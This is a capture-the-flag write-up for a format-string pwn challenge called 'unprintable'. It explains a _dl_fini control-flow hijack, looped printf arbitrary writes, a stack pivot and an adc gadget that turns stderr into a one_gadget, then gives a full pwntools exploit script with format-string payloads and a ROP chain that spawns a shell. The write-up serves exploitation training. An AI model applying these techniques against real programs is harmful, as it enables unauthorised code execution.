[中文](./README_zh.md) [English](./README.md)

[attachment.zip](./attachment.zip)

This question is actually a variant of the printable from pwnable.tw

In theory, you can print out the stack address, as long as you predict the last three bits of the stack.

The first is to hijack the control flow, there is an leaving address from ld.so on the stack

The dl_fini function is executed when exit, and there is a interesting piece in it.

```
<_dl_fini+819>: call QWORD PTR [r12+rdx*8]
```

Rdx is fixed to 0, r12 is from the following code snippet

```
<_dl_fini+777>: mov r12, QWORD PTR [rax+0x8]
<_dl_fini+781>: mov rax, QWORD PTR [rbx+0x120]
<_dl_fini+788>: add r12, QWORD PTR [rbx]
```

Rbx points to the address of the ld.so that remains on the stack, so we can control the value of \[rbx]

R12 defaults to fini_array. By controlling rbx, we can let r12 point to bss, that is, we can hijack the control flow.

But after hijacking the flow of control?

We can jump back to the main function

```
.text:00000000004007A3 mov edx, 1000h ; nbytes
.text:00000000004007A8 mov esi, offset buf ; buf
.text:00000000004007AD mov edi, 0 ; fd
.text:00000000004007B2 call read
```

Read the content again to the bss section, then printf out

If you are careful, you can find that the 23rd parameter on the stack just points to the return address of printf now, that is, we can jump back to 0x4007A3 after printf, that is, infinite loop printf

With an infinite loop printf, it's done like a regular printf

At this time, we have any arbitrary writes, we can write the contents of the printf return address on the stack, write the address of a bss section, and then use the pop rsp gadget to rop.

There is also a small pit, which is that printf can't write values ​​with %hn after more than 0x2000 bytes, so it has to be brute force to the appropriate stack address, but the probability is quite high.

With rop? We still can't leak, this time we can use a magical gadget

```
.text:00000000004006E8 adc [rbp+48h], edx
```
Rbp and edx are all controllable, just in the bss section there are stdin, stdout, sterr these values, pointing to libc

So we can use this gadget to change stderr to one_gadget and then use __libc_csu_init
```
Call qword ptr [r12+rbx*8]
```
You can get the shell

After the get shell is quite simple, use the redirect to get the flag

```
Cat flag >&0
```

## exp
```
from pwn import *

debug=1

context.log_level='debug'

if debug:
    p=process('./unprintable')
    #p=process('',env={'LD_PRELOAD':'./libc.so'})
else:
    p=remote('',)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

def wait(x=True):
    #raw_input()
    sleep(0.3)

def write_addr(addr,sz=6):
    t = (stack+0x40)%0x100
    v = p64(addr)
    for i in range(sz):
        if t+i != 0:
            se('%'+str(t+i)+'c%18$hhn%'+str(1955-t-i)+'c%23$hn\x00')
        else:
            se('%18$hhn%1955c%23$hn')
        wait()
        tv = ord(v[i])
        if tv != 0:
            se('%'+str(tv)+'c%13$hhn%'+str(1955-tv)+'c%23$hn\x00')
        else:
            se('%13$hhn%1955c%23$hn')
        wait()

def write_value(addr,value,addr_sz=6):
    write_addr(addr,addr_sz)
    se('%'+str(ord(value[0]))+'c%14$hhn%'+str(1955-ord(value[0]))+'c%23$hn\x00')
    wait()
    ta = p64(addr)[1]
    for i in range(1,len(value)):
        tmp = p64(addr+i)[1]
        if ta!=tmp:
            write_addr(addr+i,2)
            ta = tmp
        else:
            write_addr(addr+i,1)
        if ord(value[i]) !=0:
            se('%'+str(ord(value[i]))+'c%14$hhn%'+str(1955-ord(value[i]))+'c%23$hn\x00')
        else:
            se('%14$hhn%1955c%23$hn\x00')
        wait()

buf = 0x601060+0x100+4

ru('This is your gift: ')
stack = int(ru('\n'),16)-0x118

if stack%0x10000 > 0x2000:
    p.close()
    exit()

ret_addr = stack - 0xe8

se('%'+str(buf-0x600DD8)+'c%26$hn'.ljust(0x100,'\x00')+p64(0x4007A3))
wait()

tmp = (stack+0x40)%0x10000

se('%c'*16+'%'+str(tmp-16)+'c%hn%'+str((163-(tmp%0x100)+0x100)%0x100)+'c%23$hhn\x00')

wait()

if debug:
    gdb.attach(p)

raw_input()

rop = 0x601060+0x200

write_value(stack,p64(rop)[:6])


context.arch = 'amd64'

prbp = 0x400690
prsp = 0x40082d
adc = 0x4006E8
arsp = 0x0400848
prbx = 0x40082A 
call = 0x400810 
stderr = 0x601040 

payload = p64(arsp)*3
payload += flat(prbx,0,stderr-0x48,rop,0xFFD2BC07,0,0,call)
payload += flat(adc,0,prbx,0,0,stderr,0,0,0,0x400819)

se(('%'+str(0x82d)+'c%23$hn').ljust(0x200,'\0')+payload)

print(hex(stack))

p.interactive()
```